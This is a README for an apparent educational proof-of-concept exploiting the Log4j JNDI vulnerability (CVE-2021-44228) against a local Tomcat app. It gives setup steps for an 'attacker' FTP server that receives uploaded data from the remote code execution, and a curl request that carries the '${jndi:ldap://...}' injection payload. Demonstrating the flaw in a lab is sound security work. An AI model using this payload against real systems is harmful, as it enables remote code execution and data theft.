# log4jshell
log4jshell is an full fledged POC that exploit LOG4J vulnerability [CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228) introduced as part of [LOG4J2-313](https://issues.apache.org/jira/browse/LOG4J2-313)  

```
NOTE : 

PLEASE USE THIS APP ONLY FOR EDUCATION PURPOSE.

THIS APP IS DEVELOPED AS A PROOF OF CONCEPT(POC) AND IS INTENTEDED ONLY FOR EDUCATION PURPOSE. 

USING THIS POC APP TO TARGET AGAINST ANY SYSTEMS WITHOUT CONSENT IS PURELY ILLEGAL.

ANY DAMAGES CAUSED DUE TO ILLEGAL USE OF THIS APP/SOFTWARE/POC IS NOT THE RESPONSIBILITY OF THE AUTHOR.

```

## Pre-requisites
* [Python 3](https://www.python.org/downloads/)
* [Java 1.8](https://docs.oracle.com/javase/8/docs/technotes/guides/install/install_overview.html)
* [Apache Tomcat 1.9](https://tomcat.apache.org/download-90.cgi)
* [IntelliJ CE or Eclipse](https://www.jetbrains.com/idea/)


## Installation

Use the python package manager [pip3](https://pip.pypa.io/en/stable/) to install foobar.

```bash
pip3 install pyftpdlib
```

Create the FTP upload directory where the RCE will upload the information

```bash
mkdir -p /tmp/ftpuploads
```

Start the FTP Server locally
```bash
python3 src/main/python/attacker/ftp-server.py
```

## Usage

```bash
curl --location --request GET 'http://localhost:8080/log4jshell/search' \
--header 'Content-Type: application/json' \
--data-raw '{
    "searchText" : "${jndi:ldap://localhost:8389/com.demo.exploit.log4jshell.Exploit.class}"
}
'
```

## Contributing
Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.

Please make sure to update tests as appropriate.

## Acknowledgments

Some of the references code that I have used to build this POC are listed below

* [Apache Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html)
* [rfc2713](https://datatracker.ietf.org/doc/html/rfc2713)
* [marshalsec](https://github.com/mbechler/marshalsec)
* [veracode-research](https://github.com/veracode-research/rogue-jndi)
* [black hat](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)


